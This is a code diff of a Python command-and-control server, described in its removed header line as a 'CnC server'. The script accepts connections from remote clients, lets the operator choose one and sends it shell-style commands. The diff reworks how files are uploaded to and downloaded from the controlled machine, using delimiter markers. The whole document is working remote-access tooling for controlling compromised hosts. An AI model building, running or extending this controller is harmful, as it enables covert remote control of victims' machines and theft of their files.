@@ -1,12 +1,9 @@
-# CnC server
-
 #!/usr/bin/env python3
 
 import sys
 import socket
 from socket import AF_INET, SOCK_STREAM
-from common import pr, clear
-from common import Send, Receive
+from common import pr, Send, Receive
 
 # server socket
 server = socket.socket(AF_INET, SOCK_STREAM)
@@ -18,9 +15,6 @@ server.settimeout(10)
 socks = []
 clients = []
 active = False
-
-#
-dl_fn = ''
 
 def close(sock, client):
   sock.close()
@@ -53,17 +47,17 @@ while True:
     clients.append(str(a))
     refresh()
   except KeyboardInterrupt:
+    pr('\n')
     activate = int(input('Enter option: '))
     
     Send(socks[activate], 'activate')
     pr('Activating client ' + str(activate))
 
+    sock = socks[activate]
+    client = clients[activate]
     active = True
 
   while active:
-    sock = socks[activate]
-    client = clients[activate]
-
     try:
       data = Receive(sock)
     except:
@@ -72,35 +66,34 @@ while True:
       close(sock, client)
       break
 
-    if dl_fn:
+    if data.endswith('FILEXXX'):
+      d = data[:-7]
+      d, fn = d.split('FILENAMEXXX')
       try:
-        f = open(dl_fn, 'w+b')
+        f = open(fn, 'w+b')
       except IOError:
         print('Error opening file')
-      f.write(data.encode())
+      f.write(d.encode())
       f.close()
-      dl_fn = ''
 
     if data == 'exit ok':
       active = False
       close(sock, client)
       break
 
-    if not dl_fn:
-      sys.stdout.write(data)
+    sys.stdout.write(data)
+
     nc = input() # next cmd
 
-    if nc.startswith('download '):
-      dl_fn = nc.split(' ')[1]
-      
-    elif nc.startswith('upload '):
+    if nc.startswith('ul '):
+      fn = nc.split(' ')[1]
       try:
-        f = open(nc.split(' ')[1], 'rb')
+        f = open(fn, 'rb')
       except IOError:
         print('Error opening file')
       d = f.read()
-      Send(sock, d, '')
-      Send(sock, '')
       f.close()
+      d += 'FILENAMEXXX%sFILEXXXEODXXX' % fn
+      Send(sock, d)
 
-    Send(sock, nc)
+    Send(sock, nc + 'EODXXX')
